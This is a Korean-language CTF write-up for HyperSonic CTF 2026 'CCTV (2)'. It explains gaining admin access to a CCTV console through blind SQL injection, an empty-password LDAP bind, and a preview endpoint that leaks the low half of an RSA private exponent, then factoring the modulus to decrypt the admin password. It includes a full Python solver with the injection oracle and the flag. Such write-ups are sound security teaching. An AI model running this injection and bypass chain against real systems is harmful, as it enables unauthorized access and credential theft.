---
title: "HyperSonic CTF 2026 CCTV (2) Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 CCTV (2) 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Misc"]
draft: false
listed: false
---

# CCTV (2)

## 개요

`CCTV (2)`는 HS-CCTV 관리 콘솔에서 관리자 세션을 만든 뒤 대시보드에 표시되는 `Supervisor Token`을 읽는 문제입니다.

`CCTV (1)`에서 확인한 일반 사용자 세션만으로는 관리자 영역이 보이지 않습니다. 따라서 풀이의 출발점은 사용자 세션으로 접근할 수 있는 기능 중 관리자 인증으로 이어지는 부분을 찾는 것입니다. 제공된 프로그램을 보면 설정 페이지는 로그인 여부만 확인하고, 그중 overlay preview 기능이 RSA 개인 지수의 일부를 노출합니다.

풀이 흐름은 다음과 같습니다. 먼저 같은 SQL injection으로 공개 modulus `N`과 관리자 비밀번호 암호문을 읽습니다. 일반 사용자 세션으로 overlay preview를 호출해 개인 지수 `d`의 하위 1024비트를 얻습니다. 이 값을 RSA 관계식에 넣어 `N`을 인수분해하고, 관리자 로컬 비밀번호를 복구합니다.

## 문제 분석

글에서 사용할 주요 기호와 값을 먼저 정리합니다.

- `N`: 계정 비밀번호 검증에 사용하는 RSA modulus입니다.
- `e`: RSA 공개 지수입니다. 제공된 프로그램에서는 `65537`입니다.
- `d`: RSA 개인 지수입니다.
- `d0`: overlay preview에서 누출되는 `d`의 하위 1024비트입니다.
- `R`: `2^1024`입니다.
- `p`, `q`: `N`을 이루는 1024비트 소수입니다.
- `s`: `p + q`입니다.
- `C_admin`: 관리자 로컬 비밀번호의 RSA 암호문입니다.
- `operator`: `role='user'`인 일반 사용자 계정입니다.

대시보드는 세션의 `role`이 `admin`일 때만 `Supervisor Token`을 추가로 렌더링합니다.

```html
{{ADMIN_PANEL}}
```

프로그램 내부에서는 관리자 세션일 때 다음 형태의 패널이 들어갑니다.

```html
<section class="card" style="margin-top:14px">
  <div class="label">Supervisor Token</div>
  <div class="value service-token">%s</div>
</section>
```

반대로 일반 사용자 세션에서는 `Maintenance Token`만 보입니다. 따라서 `CCTV (2)`에서는 관리자 계정으로 로그인해야 합니다.

계정 테이블에는 관리자 계정의 `local_password_cipher`가 들어 있습니다. 또한 제공된 프로그램은 RSA 공개 파라미터를 `device_public_params` 테이블에도 저장합니다.

```sql
CREATE TABLE device_public_params (
    name TEXT PRIMARY KEY,
    value TEXT NOT NULL
);

INSERT INTO device_public_params(name, value)
VALUES('account_rsa_n', '{{ACCOUNT_RSA_N}}');

INSERT INTO device_public_params(name, value)
VALUES('account_rsa_e', '{{ACCOUNT_RSA_E}}');
```

로컬 비밀번호 검증은 다음 계산과 같습니다.

```text
C = password^e mod N
e = 65537
```

`CCTV (1)`에서 사용한 SQL injection은 여전히 사용할 수 있습니다. 그래서 `N`과 `C_admin`은 blind SQL injection으로 읽을 수 있습니다. 문제는 `C_admin`을 복호화하려면 `d` 또는 `p`, `q`가 필요하다는 점입니다.

관리자 LDAP 로그인은 코드에서 막혀 있습니다.

```text
if mode == "ldap" and username == "admin":
    reject
```

따라서 (1)처럼 LDAP 빈 비밀번호 바인드만으로는 관리자 세션을 만들 수 없습니다. 여기서 확인할 기능이 설정 페이지입니다. 설정 POST 핸들러들은 모두 세션 존재 여부만 확인하고 `role`은 검사하지 않습니다. 일반 사용자 세션으로도 overlay preview를 호출할 수 있습니다.

overlay preview 함수의 동작은 다음과 같이 정리할 수 있습니다.

```text
buf = zero-filled buffer
buf[0:len(label)] = label
BN_bn2lebinpad(d, buf + 0x20, 0x100)
preview = hex(buf[0:length])
length <= 160
```

`label`은 최대 32바이트이고, `d`는 `buf + 0x20`부터 little-endian으로 256바이트가 기록됩니다. `length`의 최댓값이 160이므로, 출력되는 preview에는 다음 영역이 포함됩니다.

```text
buf[0:32]     = label 및 0 padding
buf[32:160]  = d의 하위 128바이트
```

즉 일반 사용자 권한으로도 `d mod 2^1024`를 얻을 수 있습니다.

## 핵심 아이디어

RSA에서는 다음 관계가 성립합니다.

```text
N = p*q
phi = (p-1)*(q-1)
phi = N - (p+q) + 1
e*d - 1 = k*phi
1 <= k < e
```

여기서 `s = p + q`라고 두면 다음과 같이 쓸 수 있습니다.

```text
e*d - 1 = k*(N - s + 1)
```

overlay preview로 전체 `d`를 얻지는 못하지만, `d0 = d mod R`를 알고 있습니다. 양변을 `R = 2^1024`로 나눈 나머지에서 보면 다음 식을 얻습니다.

```text
A = (e*d0 - 1) mod R
A = k*(N - s + 1) mod R
```

`k`는 `e`보다 작으므로 최대 `65536`개만 확인하면 됩니다. 각 `k`에 대해 `s`의 후보를 만들고, `s`가 진짜 `p + q`인지 판별식으로 검사합니다.

```text
g = gcd(k, R)
A % g == 0
R2 = R / g
s0 = N + 1 - (A/g) * inverse(k/g, R2) mod R2
s_candidate = s0 + t*R2
D = s_candidate^2 - 4*N
```

`D`가 완전제곱이면 `p`, `q`를 복구할 수 있습니다.

```text
p = (s_candidate - sqrt(D)) / 2
q = (s_candidate + sqrt(D)) / 2
```

`p`, `q`를 얻으면 `phi`와 `d`를 다시 계산할 수 있고, `C_admin`을 복호화해 관리자 비밀번호를 얻습니다.

## 풀이 과정

### Step 1. 관리자 토큰 출력 조건 확인

먼저 대시보드 렌더링 흐름을 확인했습니다. `Supervisor Token`은 관리자 세션일 때만 `ADMIN_PANEL`에 추가됩니다. 일반 사용자 세션으로는 이 영역이 출력되지 않습니다.

따라서 (1)의 사용자 세션은 시작점일 뿐입니다. 최종 목표는 관리자 로컬 로그인에 필요한 비밀번호를 복구하는 것입니다.

### Step 2. SQL injection으로 RSA 공개값과 관리자 암호문 추출

`local` 로그인 SQL injection은 `users` 테이블뿐 아니라 같은 SQLite 데이터베이스의 다른 테이블도 읽을 수 있습니다. 먼저 RSA modulus와 관리자 암호문을 추출합니다.

```sql
SELECT value FROM device_public_params WHERE name='account_rsa_n'
```

```sql
SELECT local_password_cipher FROM users WHERE role='admin' LIMIT 1
```

두 값은 모두 16진수 문자열입니다. 결과가 직접 출력되지 않으므로 `substr` 비교를 이용해 문자열을 복구합니다. 길이가 길기 때문에 1글자씩 읽어도 되지만, 실제 solver에서는 8자리 단위로 이진 탐색하면 요청 수를 줄일 수 있습니다.

### Step 3. overlay preview에서 `d0` 누출

사용자 세션으로 `/settings/overlay`에 POST 요청을 보냅니다. `label`은 짧은 안전한 문자열로 두고, `length`는 허용되는 최댓값인 `160`으로 지정합니다.

```text
label=A
length=160
```

응답은 다음 형태입니다.

```text
preview=<hex string>
```

이 hex 문자열을 바이트로 바꾸면, 앞 32바이트는 label과 padding입니다. 그 뒤 128바이트가 `d`의 하위 바이트입니다.

```text
d0 = little_endian(preview_bytes[32:160])
```

여기서 little-endian으로 해석해야 합니다. 함수가 `BN_bn2lebinpad`를 호출해 BIGNUM을 little-endian 바이트열로 저장하기 때문입니다.

### Step 4. `d0`로 `N` 인수분해

이제 `N`, `e`, `d0`가 있습니다. `k`를 `1`부터 `e - 1`까지 대입하면서 `s = p + q` 후보를 만듭니다.

`k`가 짝수일 수도 있으므로 바로 역원을 구하지 않습니다. 먼저 `gcd(k, R)`로 나누어 합동식이 풀리는지 확인합니다. 그 뒤 `R2`에서 `s0`를 구하고, `p`, `q`가 1024비트 소수라는 범위 안에서 가능한 lift를 검사합니다.

판별식이 완전제곱이 되는 순간 `p`, `q`가 결정됩니다.

```text
D = s^2 - 4*N
D is square
```

이 조건을 만족하면 다음 식으로 두 소수를 복구합니다.

```text
p = (s - sqrt(D)) / 2
q = (s + sqrt(D)) / 2
```

### Step 5. 관리자 비밀번호 복구 및 로그인

`p`, `q`를 얻은 뒤에는 표준 RSA 복호화를 하면 됩니다.

```text
phi = (p-1)*(q-1)
d = inverse(e, phi)
admin_password = C_admin^d mod N
```

복호화한 정수를 big-endian 바이트열로 바꾸면 관리자 로컬 비밀번호가 됩니다. 이후 `mode=local`, `username=admin`으로 로그인하면 관리자 세션이 발급되고, 대시보드에서 `Supervisor Token`을 읽을 수 있습니다.

## Exploit / Solver

solver의 핵심 흐름은 다음과 같습니다.

1. `local` 로그인 SQL injection으로 operator 이름, `N`, `C_admin`을 추출합니다.
2. operator 이름으로 LDAP 빈 비밀번호 로그인을 수행해 사용자 세션을 얻습니다.
3. overlay preview를 호출해 `d0 = d mod 2^1024`를 얻습니다.
4. `N`, `e`, `d0`로 `p`, `q`를 복구합니다.
5. 관리자 비밀번호를 복호화하고 로컬 관리자 로그인으로 `Supervisor Token`을 읽습니다.

아래 코드는 핵심 루틴만 정리한 것입니다. 대상 주소는 실행 시 인자로 받는다고 가정합니다.

```python
import math
import re
import string
from urllib.parse import urljoin

import requests


HEX = "0123456789abcdef"
USER_CHARS = string.ascii_letters + string.digits + "_-."
E = 65537
R = 1 << 1024


class Oracle:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/") + "/"
        self.session = requests.Session()

    def query(self, condition):
        payload = "' OR (" + condition + ") -- "
        r = self.session.post(
            urljoin(self.base, "login"),
            data={"mode": "local", "username": payload, "password": "x"},
            timeout=10,
            allow_redirects=False,
        )

        if "Password verification failed." in r.text:
            return True
        if "Account not found." in r.text:
            return False
        raise RuntimeError("unexpected oracle response")

    def extract_int(self, expr, lo, hi):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.query(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract_text(self, expr, alphabet, max_len):
        length = self.extract_int(f"length(({expr}))", 0, max_len)
        out = []

        for pos in range(1, length + 1):
            for ch in alphabet:
                if self.query(f"substr(({expr}),{pos},1)='{ch}'"):
                    out.append(ch)
                    break
            else:
                raise RuntimeError(f"no character match at {pos}")

        return "".join(out)

    def extract_hex_by_chunk(self, expr, length, width=8):
        out = []

        for start in range(1, length + 1, width):
            size = min(width, length - start + 1)
            lo = 0
            hi = 16 ** size - 1

            while lo < hi:
                mid = (lo + hi) // 2
                mid_hex = f"{mid:0{size}x}"
                cond = f"substr(({expr}),{start},{size})>'{mid_hex}'"
                if self.query(cond):
                    lo = mid + 1
                else:
                    hi = mid

            out.append(f"{lo:0{size}x}")

        return "".join(out)


def leak_d0(base_url, operator):
    session = requests.Session()
    session.post(
        urljoin(base_url.rstrip("/") + "/", "login"),
        data={"mode": "ldap", "username": operator, "password": ""},
        timeout=10,
        allow_redirects=False,
    )

    r = session.post(
        urljoin(base_url.rstrip("/") + "/", "settings/overlay"),
        data={"label": "A", "length": "160"},
        timeout=10,
    )
    m = re.search(r"preview=([0-9a-f]+)", r.text)
    if not m:
        raise RuntimeError("overlay preview not found")

    preview = bytes.fromhex(m.group(1))
    return int.from_bytes(preview[32:160], "little")


def recover_factors(n, e, d0):
    a_value = (e * d0 - 1) % R
    s_min = 1 << 1024
    s_max = 1 << 1025

    for k in range(1, e):
        g = math.gcd(k, R)
        if a_value % g != 0:
            continue

        r2 = R // g
        left = a_value // g
        k2 = k // g

        s0 = (n + 1 - left * pow(k2, -1, r2)) % r2
        lift_start = max(0, (s_min - s0 + r2 - 1) // r2)
        lift_end = (s_max - s0 + r2 - 1) // r2

        for lift in range(lift_start, lift_end + 1):
            s = s0 + lift * r2
            disc = s * s - 4 * n
            if disc < 0:
                continue

            root = math.isqrt(disc)
            if root * root != disc:
                continue

            p = (s - root) // 2
            q = (s + root) // 2
            if p * q == n:
                return p, q

    raise RuntimeError("failed to factor modulus")


def solve(base_url):
    oracle = Oracle(base_url)

    operator = oracle.extract_text(
        "SELECT username FROM users WHERE role='user' LIMIT 1",
        USER_CHARS,
        64,
    )

    n_hex = oracle.extract_hex_by_chunk(
        "SELECT value FROM device_public_params WHERE name='account_rsa_n'",
        512,
    )
    c_hex = oracle.extract_hex_by_chunk(
        "SELECT local_password_cipher FROM users WHERE role='admin' LIMIT 1",
        512,
    )

    n = int(n_hex, 16)
    c_admin = int(c_hex, 16)
    d0 = leak_d0(base_url, operator)

    p, q = recover_factors(n, E, d0)
    phi = (p - 1) * (q - 1)
    d = pow(E, -1, phi)

    password_int = pow(c_admin, d, n)
    password = password_int.to_bytes(
        (password_int.bit_length() + 7) // 8,
        "big",
    ).decode()

    session = requests.Session()
    session.post(
        urljoin(base_url.rstrip("/") + "/", "login"),
        data={"mode": "local", "username": "admin", "password": password},
        timeout=10,
        allow_redirects=False,
    )

    dashboard = session.get(
        urljoin(base_url.rstrip("/") + "/", "dashboard"),
        timeout=10,
    ).text

    token = re.search(
        r"Supervisor Token.*?service-token[^>]*>([^<]+)<",
        dashboard,
        re.S,
    )
    if not token:
        raise RuntimeError("supervisor token not found")

    return token.group(1).strip()
```

## 결과

실제 대상에서 overlay preview로 `d`의 하위 1024비트를 얻고, 이를 이용해 `N`을 인수분해했습니다. 복구한 관리자 비밀번호로 로컬 로그인한 뒤 대시보드의 `Supervisor Token`에서 다음 값을 확인했습니다.

```text
HS{v3ry_3asy_c0ppersm1th!!!!!!!!!!}
```
